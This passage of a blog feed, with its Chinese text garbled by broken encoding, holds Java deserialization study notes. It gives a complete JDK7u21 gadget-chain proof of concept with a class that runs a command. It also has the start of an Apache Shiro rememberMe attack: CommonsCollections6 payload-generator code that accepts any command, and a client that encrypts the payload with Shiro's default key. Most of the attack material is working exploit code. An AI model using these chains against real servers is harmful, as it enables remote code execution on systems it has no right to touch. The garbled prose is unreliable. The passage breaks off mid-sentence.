ä¸ºgetMemberMethodsä¼šéå†å…¶æ–¹æ³•)</li><li>ä»–çš„memberValueså±æ€§æ˜¯ä¸€ä¸ªMapï¼ŒMapåªæœ‰ä¸€ä¸ªKeyå’ŒValueï¼ŒKeyæ˜¯f5a5a608ï¼Œvalueæ˜¯TemplateImplç±»</li></ul></li><li>å¯¹ AnnotationInvocationHandlerå¯¹è±¡åšä¸€å±‚ä»£ç†ï¼Œç”Ÿæˆproxy å¯¹è±¡(å› ä¸ºè¦è¿›å…¥invoke è°ƒç”¨hashcode)</li><li>å®ä¾‹åŒ–ä¸€ä¸ªHashSet è¿™ä¸ª HashSet æœ‰ä¸¤ä¸ªå…ƒç´  åˆ†åˆ«æ˜¯<ul><li>TemplateImplå¯¹è±¡</li><li>proxyå¯¹è±¡</li></ul></li><li>å°†HashSet å¯¹è±¡åºåˆ—åŒ–</li></ul><p>ååºåˆ—åŒ–è§¦å‘ä»£ç å¦‚ä¸‹ï¼š</p><ul><li>è§¦å‘HashSetçš„readobjectæ–¹æ³•ï¼Œå…¶ä¸­ ä½¿ç”¨HashMapçš„Keyå»é‡</li><li>å»é‡æ—¶è®¡ç®—HashSetä¸­çš„ä¸¤ä¸ªå…ƒç´ çš„ hashCode() ï¼Œå› ä¸ºæˆ‘ä»¬çš„é™å¿ƒæ„é€ äºŒè€…ç›¸ç­‰ï¼Œè¿›è€Œè§¦å‘ equals() æ–¹æ³•</li><li>è°ƒç”¨ AnnotationInvocationHandler#equalsImpl æ–¹æ³•</li><li>equalsImpl ä¸­éå† this.type çš„æ¯ä¸ªæ–¹æ³•å¹¶è°ƒç”¨</li><li>å› ä¸º this.type æ˜¯TemplatesImplç±»ï¼Œæ‰€ä»¥è§¦å‘äº† newTransform() æˆ– getOutputProperties() æ–¹æ³•</li><li>ä»£ç æ‰§è¡Œ</li></ul><p>æŒ‰æˆ‘çš„ç†è§£ç®€å•æ¥è¯´ï¼Œå°±æ˜¯åˆ©ç”¨hashCodeImpl() ä½¿ ä¸¤è€…çš„keyçš„hashç›¸åŒï¼Œå°±ä¼šè¿›è¡Œæ¯”è¾ƒï¼Œè°ƒç”¨ equalsæ–¹æ³•ï¼Œä»è€Œè¿›è¡Œæ¼æ´åˆ©ç”¨ã€‚<br>è®©æˆ‘éœ‡æƒŠçš„å°±æ˜¯equalsçš„è°ƒç”¨å’Œè¿™ä¸ªhashå€¼çš„æ„é€ ï¼Œå±å®tql</p><p>POCï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line">import javassist.ClassPool;</span><br><span class="line">import org.apache.commons.codec.binary.Base64;</span><br><span class="line">import javax.xml.transform.Templates;</span><br><span class="line">import java.io.ByteArrayInputStream;</span><br><span class="line">import java.io.ByteArrayOutputStream;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.lang.reflect.InvocationHandler;</span><br><span class="line">import java.lang.reflect.Proxy;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.HashSet;</span><br><span class="line">import java.util.LinkedHashSet;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class JDK7u21 &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        TemplatesImpl templates = new TemplatesImpl();</span><br><span class="line">        setFieldValue(templates, &quot;_bytecodes&quot;, new byte[][]&#123;</span><br><span class="line">                ClassPool.getDefault().get(evil.EvilTemplatesImpl.class.getName()).toBytecode()</span><br><span class="line">        &#125;);</span><br><span class="line">        setFieldValue(templates, &quot;_name&quot;, &quot;HelloTemplatesImpl&quot;);</span><br><span class="line">        setFieldValue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line">        String zeroHashCodeStr = &quot;f5a5a608&quot;;</span><br><span class="line"></span><br><span class="line">        // å®ä¾‹åŒ–ä¸€ä¸ªmapï¼Œå¹¶æ·»åŠ Magic Numberä¸ºkeyï¼Œä¹Ÿå°±æ˜¯f5a5a608ï¼Œvalueå…ˆéšä¾¿è®¾ç½®ä¸€ä¸ªå€¼</span><br><span class="line">        HashMap map = new HashMap();</span><br><span class="line">        map.put(zeroHashCodeStr, &quot;foo&quot;);</span><br><span class="line"></span><br><span class="line">        // å®ä¾‹åŒ–AnnotationInvocationHandlerç±»</span><br><span class="line">        Constructor handlerConstructor = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        handlerConstructor.setAccessible(true);</span><br><span class="line">        InvocationHandler tempHandler = (InvocationHandler) handlerConstructor.newInstance(Templates.class, map);</span><br><span class="line"></span><br><span class="line">        // ä¸ºtempHandleråˆ›é€ ä¸€å±‚ä»£ç†</span><br><span class="line">        Templates proxy = (Templates) Proxy.newProxyInstance(JDK7u21.class.getClassLoader(), new Class[]&#123;Templates.class&#125;, tempHandler);</span><br><span class="line"></span><br><span class="line">        // å®ä¾‹åŒ–HashSetï¼Œå¹¶å°†ä¸¤ä¸ªå¯¹è±¡æ”¾è¿›å»</span><br><span class="line">        HashSet set = new LinkedHashSet();</span><br><span class="line">        set.add(templates);</span><br><span class="line">        set.add(proxy);</span><br><span class="line"></span><br><span class="line">        // å°†æ¶æ„templatesè®¾ç½®åˆ°mapä¸­</span><br><span class="line">        map.put(zeroHashCodeStr, templates);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream barr = new ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(set);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">        Object o = (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception &#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(true);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æˆ‘ä¼šç»™å¤§å®¶å‰–æ POC æ€ä¹ˆæ„é€ çš„ï¼Œæ·±åˆ»ç†è§£POCåŸç†</p><p>é›·æ‰“ä¸åŠ¨çš„ TemplatesImplå¯¹è±¡è®¾ç½®ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl templates = new TemplatesImpl();</span><br><span class="line">SerializeUtil.setFieldValue(templates,&quot;_bytecodes&quot;,new byte[][]&#123;evilCode&#125;);</span><br><span class="line">SerializeUtil.setFieldValue(templates,&quot;_name&quot;,&quot;Ku1s&quot;);</span><br></pre></td></tr></table></figure><p>ç„¶åæ˜¯ new ä¸€ä¸ª AnnotationInvocationHandlerå¯¹è±¡ï¼Œçœ‹çœ‹ä»–çš„æ„é€ å™¨ï¼š</p><p><img src="/2023/05/20/JAVA-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BEJDK7u21/5.jpg"></p><p>å‰é¢ä¹Ÿè¯´è¿‡ï¼Œtype æ˜¯ TemplatesImplå¯¹è±¡ï¼Œå°†å¾ªç¯è°ƒç”¨ä»–å…¨éƒ¨æ–¹æ³•ï¼Œè€ŒmemberMethods æ˜¯ä¸€ä¸ªé”®å€¼å¯¹ï¼Œå…¶Key æ˜¯ 0 ï¼Œvalue åˆ™æ˜¯ TemplatesImpl.hash ã€‚</p><p><img src="/2023/05/20/JAVA-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BEJDK7u21/6.jpg"></p><p><img src="/2023/05/20/JAVA-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BEJDK7u21/7.png"></p><p>æ‰€ä»¥æˆ‘ä»¬ å…ˆåˆ›å»ºä¸€ä¸ª memberMethods ï¼Œæˆ‘ä»¬ä¹Ÿè¯´è¿‡ï¼Œä»–æœ¬è´¨ä¸Šæ˜¯ä¸ªHashMap ï¼Œæ·»åŠ å…¶å€¼ï¼Œæˆ‘ä»¬å…ˆä¸æŠŠTemplatesImpl æ”¾è¿› memberValuesçš„valueï¼Œå¾…ä¼šä¼šè¯´ä¸ºä»€ä¹ˆï¼Œç„¶åå†å®ä¾‹åŒ– AnnotationInvocationHandlerï¼Œè¿›è¡Œåˆå§‹åŒ–æ„é€ (å› ä¸ºæ­¤ç±»æ— æ³•new æ‰€ä»¥è¦ class.forname) ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HashMap&lt;String, Object&gt; memberValue = new HashMap&lt;String, Object&gt;();  </span><br><span class="line">memberValue.put(&quot;f5a5a608&quot;,&quot;Ku1s&quot;);  </span><br><span class="line">Class&lt;?&gt; clazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);  </span><br><span class="line">Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructor(Class.class, Map.class); //å¾—åˆ°æ„é€ å™¨  </span><br><span class="line">constructor.setAccessible(true);  </span><br><span class="line">InvocationHandler  handler = (InvocationHandler) constructor.newInstance(Templates.class, memberValue); //å®ä¾‹åŒ–</span><br></pre></td></tr></table></figure><p>ç„¶åå°±æ˜¯ç”ŸæˆåŠ¨æ€ä»£ç†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Templates proxy = (Templates) Proxy.newProxyInstance(Templates.class.getClassLoader(), new Class[]&#123;Templates.class&#125;, handler);</span><br></pre></td></tr></table></figure><p>ç„¶åå°±æ˜¯ç”Ÿæˆååºåˆ—åŒ–é“¾çš„èµ·ç‚¹ï¼Œé‚£ä¸ª<code>HashSet</code>å¯¹è±¡äº†ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HashSet hashSet = new LinkedHashSet();</span><br><span class="line">hashSet.add(templates);</span><br><span class="line">hashSet.add(proxy);</span><br><span class="line">memberValues.put(&quot;f5a5a608&quot;,templates);</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå†è¦†ç›–æ‰<code>f5a5a608</code>çš„valueï¼Œå°±æ˜¯ä¸ºäº†é˜²æ­¢è¿™é‡Œçš„2æ¬¡<code>add</code>ç›´æ¥è§¦å‘äº†æ¼æ´ã€‚ </p><p>å®Œæ•´POCï¼š<br>JDK7u21.class</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">public class JDK7u21 &#123;  </span><br><span class="line">    public static void main(String[] args) throws Exception &#123;  </span><br><span class="line">        TemplatesImpl templates = new TemplatesImpl();  </span><br><span class="line">        setFieldValue(templates, &quot;_bytecodes&quot;, new byte[][]&#123;  </span><br><span class="line">            ClassPool.getDefault().get(evil.EvilTemplatesImpl.class.getName()).toBytecode()  </span><br><span class="line">        &#125;);  </span><br><span class="line">        setFieldValue(templates, &quot;_name&quot;, &quot;Ku1s&quot;);  </span><br><span class="line">        setFieldValue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl());  </span><br><span class="line">  </span><br><span class="line">        HashMap&lt;String, Object&gt; memberValue = new HashMap&lt;String, Object&gt;();  </span><br><span class="line">        memberValue.put(&quot;f5a5a608&quot;,&quot;Ku1s&quot;);  </span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);  </span><br><span class="line">        Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructor(Class.class, Map.class); //å¾—åˆ°æ„é€ å™¨  </span><br><span class="line">        constructor.setAccessible(true);  </span><br><span class="line">        InvocationHandler  handler = (InvocationHandler) constructor.newInstance(Templates.class, memberValue); //å®ä¾‹åŒ–  </span><br><span class="line">  </span><br><span class="line">        //ç„¶åå°±æ˜¯ç”ŸæˆåŠ¨æ€ä»£ç†  </span><br><span class="line">        Templates proxy = (Templates) Proxy.newProxyInstance(Templates.class.getClassLoader(), new Class[]&#123;Templates.class&#125;, handler);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        HashSet hashSet = new LinkedHashSet();  </span><br><span class="line">        hashSet.add(templates);  </span><br><span class="line">        hashSet.add(proxy);  </span><br><span class="line">  </span><br><span class="line">        memberValue.put(&quot;f5a5a608&quot;,templates);  </span><br><span class="line">        byte[] bytes = serialize(hashSet);  </span><br><span class="line">        unserialize(bytes);  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception &#123;  </span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldName);  </span><br><span class="line">        field.setAccessible(true);  </span><br><span class="line">        field.set(obj, value);  </span><br><span class="line">    &#125;  </span><br><span class="line">    public static void unserialize(byte[] bytes) throws Exception&#123;  </span><br><span class="line">        try(ByteArrayInputStream bain = new ByteArrayInputStream(bytes);  </span><br><span class="line">            ObjectInputStream oin = new ObjectInputStream(bain))&#123;  </span><br><span class="line">            oin.readObject();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    public static byte[] serialize(Object o) throws Exception &#123;  </span><br><span class="line">        try (ByteArrayOutputStream baout = new ByteArrayOutputStream();  </span><br><span class="line">             ObjectOutputStream oout = new ObjectOutputStream(baout)) &#123;  </span><br><span class="line">            oout.writeObject(o);  </span><br><span class="line">            return baout.toByteArray();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>EvilTest.class</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line">import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line">import com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line">public class EvilTest extends AbstractTranslet &#123;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    public EvilTest() throws Exception&#123;</span><br><span class="line">        Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>æœ‰ç‚¹æ‚ä¹±ï¼Œä½†é€šè¿‡è¿™æ¬¡å­¦ä¹ æ˜ç™½äº†è®¸å¤šçŸ¥è¯†ç‚¹ï¼Œè¿˜ä¼šç»§ç»­å­¦ä¹ ï¼Œåé¢ä¼šåˆ†æ 8u20ï¼Œ7u21åœ¨ 7u25ä¸­ä¿®å¤äº†ï¼Œä½†è¿˜æ˜¯ä¼šæœ‰å®‰å…¨é—®é¢˜ã€‚</p><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p>ã€ŠJAVAå®‰å…¨æ¼«è°ˆã€‹</p>]]></content>
      
      
      <categories>
          
          <category> JAVAå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JAVA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JAVA-Shiroååºåˆ—åŒ–è¯¦è§£</title>
      <link href="/2023/05/19/JAVA-Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/"/>
      <url>/2023/05/19/JAVA-Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="ç¯å¢ƒå‡†å¤‡"><a href="#ç¯å¢ƒå‡†å¤‡" class="headerlink" title="ç¯å¢ƒå‡†å¤‡"></a>ç¯å¢ƒå‡†å¤‡</h1><p>å‚è€ƒ ï¼š<a href="https://blog.csdn.net/m0_67401270/article/details/126721347">Shiroç¯å¢ƒæ­å»º</a></p><h1 id="å‰æ™¯å›é¡¾"><a href="#å‰æ™¯å›é¡¾" class="headerlink" title="å‰æ™¯å›é¡¾"></a>å‰æ™¯å›é¡¾</h1><p>shiroçˆ†å‡ºäº†ä¸€ä¸ªé»˜è®¤keyçš„ååºåˆ—åŒ–æ¼æ´ã€‚è‡³ä»Šå·²æœ‰å¤§é‡çš„åˆ†ææ–‡ç« åˆ†æäº†è¯¥æ¼æ´çš„åŸç†ï¼Œæ‰€ä»¥æœ¬æ–‡ä¸å†é‡å¤åˆ†æè¯¥æ¼æ´çš„ç›¸å…³åŸç†ï¼Œå¯ä»¥å‚è€ƒä»¥ä¸‹å‡ ç¯‡æ–‡ç« çš„åˆ†æï¼š</p><ul><li><a href="https://blog.knownsec.com/2016/08/apache-shiro-java/">https://blog.knownsec.com/2016/08/apache-shiro-java/</a></li><li><a href="https://blog.zsxsoft.com/post/35">https://blog.zsxsoft.com/post/35</a></li><li><a href="http://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html">http://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html</a></li></ul><p>ä¹Ÿå¯ä»¥å‚è€ƒæˆ‘åœ¨CSDN ä¸­å†™è¿‡çš„æ–‡ç« :<br><a href="https://blog.csdn.net/snowlyzz/article/details/128192360?spm=1001.2014.3001.5501">[Javaååºåˆ—åŒ–]â€”Shiroååºåˆ—åŒ–(äºŒ)_ååºåˆ—åŒ–ccé“¾_snowlyzzçš„åšå®¢-CSDNåšå®¢</a><br>åŸå› å¯èƒ½æ˜¯å½“æ—¶å†™çš„ä¸å¤Ÿè¯¦ç»†ï¼Œä¹Ÿä¸å¤Ÿæ·±å…¥ï¼Œè‡³æ­¤ï¼Œæœ¬ç«™çš„åšå®¢éƒ½ ä¼šæ‰“é€ ä¸€ä¸ª è¯¦ç»†æ·±å…¥çš„å­¦ä¹ </p><p>è¿›å…¥æ­£é¢˜ï¼š</p><p>å¦‚æœç™»å½•æ—¶é€‰æ‹©äº†remember meçš„å¤šé€‰æ¡†ï¼Œåˆ™ç™»å½•æˆåŠŸåæœåŠ¡ç«¯ä¼šè¿”å›ä¸€ä¸ªrememberMeçš„Cookieï¼š</p><p><img src="/2023/05/19/JAVA-Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/1.jpg"></p><p>å¯¹æ­¤ï¼Œæˆ‘ä»¬æ”»å‡»è¿‡ç¨‹å¦‚ä¸‹ï¼š </p><ol><li>ä½¿ç”¨ä»¥å‰å­¦è¿‡çš„CommonsCollectionsåˆ©ç”¨é“¾ç”Ÿæˆä¸€ä¸ªåºåˆ—åŒ–Payload </li><li>ä½¿ç”¨Shiroé»˜è®¤Keyè¿›è¡ŒåŠ å¯† </li><li>å°†å¯†æ–‡ä½œä¸ºrememberMeçš„Cookieå‘é€ç»™æœåŠ¡ç«¯ï¼š</li></ol><p>è¿™é‡Œç»“åˆCC6  ç¼–å†™æˆä¸€ä¸ªCLASSè¿›è¡Œè§¦å‘é“¾å­ï¼š</p><p>CC6.CLASS</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line">import java.io.ByteArrayOutputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public class CommonsCollections6 &#123;</span><br><span class="line">    public byte[] getPayload(String command) throws Exception &#123;</span><br><span class="line">        Transformer[] fakeTransformers = new Transformer[] &#123;new ConstantTransformer(1)&#125;;</span><br><span class="line">        Transformer[] transformers = new Transformer[] &#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123; String.class,</span><br><span class="line">                        Class[].class &#125;, new Object[] &#123; &quot;getRuntime&quot;,</span><br><span class="line">                        new Class[0] &#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123; Object.class,</span><br><span class="line">                        Object[].class &#125;, new Object[] &#123; null, new Object[0] &#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[] &#123; String.class &#125;,</span><br><span class="line">                        new String[] &#123; command &#125;),</span><br><span class="line">                new ConstantTransformer(1),</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = new ChainedTransformer(fakeTransformers);</span><br><span class="line"></span><br><span class="line">        // ä¸å†ä½¿ç”¨åŸCommonsCollections6ä¸­çš„HashSetï¼Œç›´æ¥ä½¿ç”¨HashMap</span><br><span class="line">        Map innerMap = new HashMap();</span><br><span class="line">        Map outerMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">        TiedMapEntry tme = new TiedMapEntry(outerMap, &quot;keykey&quot;);</span><br><span class="line"></span><br><span class="line">        Map expMap = new HashMap();</span><br><span class="line">        expMap.put(tme, &quot;valuevalue&quot;);</span><br><span class="line"></span><br><span class="line">        outerMap.remove(&quot;keykey&quot;);</span><br><span class="line"></span><br><span class="line">        Field f = ChainedTransformer.class.getDeclaredField(&quot;iTransformers&quot;);</span><br><span class="line">        f.setAccessible(true);</span><br><span class="line">        f.set(transformerChain, transformers);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream barr = new ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(expMap);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        return barr.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Client.class</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import org.apache.shiro.codec.Base64;  </span><br><span class="line">import org.apache.shiro.crypto.AesCipherService;  </span><br><span class="line">import org.apache.shiro.util.ByteSource;  </span><br><span class="line">public class Client &#123;  </span><br><span class="line">    public static void main(String []args) throws Exception &#123;  </span><br><span class="line">        byte[] payloads = new CommonsCollections6().getPayload(&quot;calc.exe&quot;);  </span><br><span class="line">        AesCipherService aes = new AesCipherService();  </span><br><span class="line">        byte[] key = Base64.decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;);  </span><br><span class="line">        ByteSource ciphertext = aes.encrypt(payloads, key);  </span><br><span class="line">        System.out.printf(ciphertext.toString());  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç›®çš„æ˜¯å°† å‚æ•°ä¼ å…¥CC6 ï¼Œå†å°†payload è¿›è¡Œ aes åŠ å¯†ï¼Œä¼ å…¥ Shiro å®¢æˆ·ç«¯ä¸­ä¼šå‘ç°ç»“æœæ²¡æœ‰åƒé¢„æƒ³é‚£æ · å¼¹å‡ºè®¡ç®—å™¨ï¼Œè¿™æ˜¯ä¸ºä»€ä¹ˆï¼Ÿ</p><p><img src="/2023/05/19/JAVA-Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/x.jpg"></p><p>æˆ‘ä»¬ä»æŠ¥é”™ä¿¡æ¯ 